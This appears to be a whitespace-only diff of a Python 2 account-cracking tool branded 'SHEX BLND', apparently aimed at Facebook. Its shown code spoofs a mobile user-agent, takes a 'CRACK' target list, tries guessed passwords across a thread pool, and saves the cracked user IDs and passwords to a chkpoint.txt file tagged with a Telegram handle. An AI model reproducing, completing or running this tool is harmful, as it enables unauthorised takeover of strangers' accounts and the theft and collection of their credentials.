@@ -15,14 +15,12 @@ def anime(z):
 print("FB GRABER")
 os.system('clear')
 
-
 reload(sys)
 sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1')]
-
 
 def kelwa():
 	exlogo = """
@@ -38,7 +36,6 @@ def acak(b):
         d += '!'+w[random.randint(0,len(w)-1)]+i
     return cetak(d)
 
-
 def cetak(b):
     w = 'ahtdzjc'
     for i in w:
@@ -47,13 +44,9 @@ def cetak(b):
     x += '\033[0m'
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
-
-
-                                  
+                              
 #### LOGO ####
 logo = """
-
-
 
 \033[1;91m
  
@@ -63,21 +56,18 @@ logo = """
 ░╚═══██╗██╔══██║██╔══╝░░░██╔██╗░
 ██████╔╝██║░░██║███████╗██╔╝╚██╗
 ╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
-
 ██████╗░██╗░░░░░███╗░░██╗██████╗░
 ██╔══██╗██║░░░░░████╗░██║██╔══██╗
 ██████╦╝██║░░░░░██╔██╗██║██║░░██║
 ██╔══██╗██║░░░░░██║╚████║██║░░██║
 ██████╦╝███████╗██║░╚███║██████╔╝
 ╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░
-
 """
 def tik():
 	titik = ['.', '..', '...', '....', '.....', '......', '.......']
 	print (" ")
 	for o in titik:
 		print("\r\x1b[32;1m    Wait to Login\x1b[37;1m"+o+"\x1b[0m"),;sys.stdout.flush();time.sleep(1)
-
 
 back = 0
 berhasil = []
@@ -98,16 +88,13 @@ RH = """
 ░╚═══██╗██╔══██║██╔══╝░░░██╔██╗░
 ██████╔╝██║░░██║███████╗██╔╝╚██╗
 ╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
-
 ██████╗░██╗░░░░░███╗░░██╗██████╗░
 ██╔══██╗██║░░░░░████╗░██║██╔══██╗
 ██████╦╝██║░░░░░██╔██╗██║██║░░██║
 ██╔══██╗██║░░░░░██║╚████║██║░░██║
 ██████╦╝███████╗██║░╚███║██████╔╝
 ╚═════╝░╚══════╝╚═╝░░╚══╝╚═════╝░
-
 """
-
 print(RH)
 def login():
 	os.system('clear')
@@ -165,8 +152,6 @@ def login():
 			os.system('rm -rf login.txt')
 			time.sleep(2)
 			login()
-
-
 def menu():
 	os.system('clear')
 	try:
@@ -201,14 +186,12 @@ def menu():
 	#subid
 	xxj = """
 \x1b[32;34
-
 ░██████╗██╗░░██╗███████╗██╗░░██╗
 ██╔════╝██║░░██║██╔════╝╚██╗██╔╝
 ╚█████╗░███████║█████╗░░░╚███╔╝░
 ░╚═══██╗██╔══██║██╔══╝░░░██╔██╗░
 ██████╔╝██║░░██║███████╗██╔╝╚██╗
 ╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
-
 ██████╗░██╗░░░░░███╗░░██╗██████╗░
 ██╔══██╗██║░░░░░████╗░██║██╔══██╗
 ██████╦╝██║░░░░░██╔██╗██║██║░░██║
@@ -271,7 +254,6 @@ def graber():
 	print("\x1b[37;1m[ 0 ] GARANAWA \x1b[0m")
 	print("\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m")
 	startgrab()
-
 def startgrab():
 	id = []
 	peak = raw_input("\x1b[32;1mCRACK : \x1b[37;1m")
@@ -552,13 +534,9 @@ def startgrab():
 																	       print('\x1b[31;1mPassword : \x1b[37;1m'+ pass10  + '\n'+"\x1b[0m")
 																	       cek = open("chkpoint.txt", "a")
 																               cek.write("{ = SHEX BLND = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n Tele: @SHEX_CRACKER")
-																	       cek.close()
-
-
-
-
-															       cekpoint.append(user+pass10)
-		except:
+																               cek.close()		
+												                                               cekpoint.append(user+pass10)
+		except:   
 			pass
 		
 	p = ThreadPool(15)
